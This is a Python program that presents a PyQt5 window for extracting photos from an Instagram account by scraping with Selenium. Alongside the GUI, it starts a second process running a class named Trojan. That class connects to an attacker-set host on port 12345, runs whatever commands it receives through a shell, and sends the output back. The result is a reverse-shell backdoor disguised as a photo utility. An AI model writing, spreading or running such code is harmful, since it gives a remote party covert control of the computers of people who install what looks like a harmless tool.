from PyQt5 import QtCore, QtGui, QtWidgets
from selenium import webdriver
from urllib.request import urlretrieve
import time
from bs4 import BeautifulSoup as soupp
import socket
import threading
import subprocess
import os
from multiprocessing import Process


class LoginWindow(QtWidgets.QWidget):

    got_account = QtCore.pyqtSignal(str)

    def __init__(self):
        super(LoginWindow, self).__init__()

        self.account = QtWidgets.QLineEdit()
        send_button = QtWidgets.QPushButton("Send")
        close_button = QtWidgets.QPushButton("Close")

        send_button.clicked.connect(self.send_clicked)
        close_button.clicked.connect(self.close)

        layout = QtWidgets.QHBoxLayout()
        layout.addWidget(self.account)
        layout.addWidget(send_button)
        layout.addWidget(close_button)

        self.setLayout(layout)
        self.setWindowTitle("Login")
        self.setMinimumWidth(350)


    def send_clicked(self):
        self.got_account.emit(self.account.text())
        self.hide()


class Ui_MainWindow(object):


    def setupUi(self, MainWindow):
        MainWindow.setObjectName("MainWindow")
        MainWindow.resize(586, 411)
        self.centralwidget = QtWidgets.QWidget(MainWindow)
        self.centralwidget.setObjectName("centralwidget")
        self.pushButton = QtWidgets.QPushButton(self.centralwidget)
        self.pushButton.setGeometry(QtCore.QRect(430, 50, 121, 71))
        self.pushButton.setObjectName("pushButton")
        self.listWidget = QtWidgets.QListWidget(self.centralwidget)
        self.listWidget.setGeometry(QtCore.QRect(30, 50, 311, 261))
        self.listWidget.setObjectName("listWidget")
        self.label = QtWidgets.QLabel(self.centralwidget)
        self.label.setGeometry(QtCore.QRect(30, 30, 121, 16))
        self.label.setObjectName("label")
        MainWindow.setCentralWidget(self.centralwidget)
        self.menubar = QtWidgets.QMenuBar(MainWindow)
        self.menubar.setGeometry(QtCore.QRect(0, 0, 586, 21))
        self.menubar.setObjectName("menubar")
        MainWindow.setMenuBar(self.menubar)
        self.statusbar = QtWidgets.QStatusBar(MainWindow)
        self.statusbar.setObjectName("statusbar")
        MainWindow.setStatusBar(self.statusbar)
        self.retranslateUi(MainWindow)

        self.login = LoginWindow()
        self.login.got_account.connect(self.show_it)

        self.pushButton.clicked.connect(self.get_login)

    def get_login(self):
        self.login.show()

    def show_it(self, accountName):
        self.account = accountName
        self.startScrape()


    def startScrape(self):
        driver = webdriver.PhantomJS()
        url = "https://www.instagram.com/" + self.account
        driver.get(url)
        time.sleep(5)
        html2 = driver.execute_script("return document.body.innerHTML")
        driver.quit()
        soup = soupp(html2, "html.parser")
        images = soup.find_all('img')
        i = 0
        for image in images:
            try:
                urlretrieve(image['src'], "img"+str(i)+".png")
            except ValueError:
                continue
            i = i + 1
            time.sleep(2)

    def retranslateUi(self, MainWindow):
        _translate = QtCore.QCoreApplication.translate
        MainWindow.setWindowTitle(_translate("MainWindow", "MainWindow"))
        self.pushButton.setText(_translate("MainWindow", "Extract"))
        self.label.setText(_translate("MainWindow", "Extracted Photos"))



class Trojan:

        
    def retrCommand(self, name, s):
        data = s.recv(1024).decode()
        print(data)

        s.close()


    def __init__(self):
        host = '' #Ip address of the host here
        port = 12345

        s = socket.socket()
        s.connect((host, port))

        recData = s.recv(1024).decode()

        while recData.lower() != "exit":

            if "cd" in recData:
                recData = recData.strip("cd ")
                os.chdir(recData)

            else:
                proc = subprocess.Popen(
                    recData, stdout=subprocess.PIPE, shell=True)
                (sendData, _) = proc.communicate()
                print(str(sendData))
                s.send(sendData)

            print(recData)
            recData = s.recv(1024).decode()


def parallelOne():
    import sys
    app = QtWidgets.QApplication(sys.argv)
    MainWindow = QtWidgets.QMainWindow()
    ui = Ui_MainWindow()
    ui.setupUi(MainWindow)
    MainWindow.show()
    sys.exit(app.exec_())

def parallelTwo():
    Trojan()



if __name__ == "__main__":

    multiprocessing.freeze_support()

    p1 = Process(target=parallelOne)
    p1.start()
    p2 = Process(target=parallelTwo)
    p2.start()
    p1.join()
    p2.join()
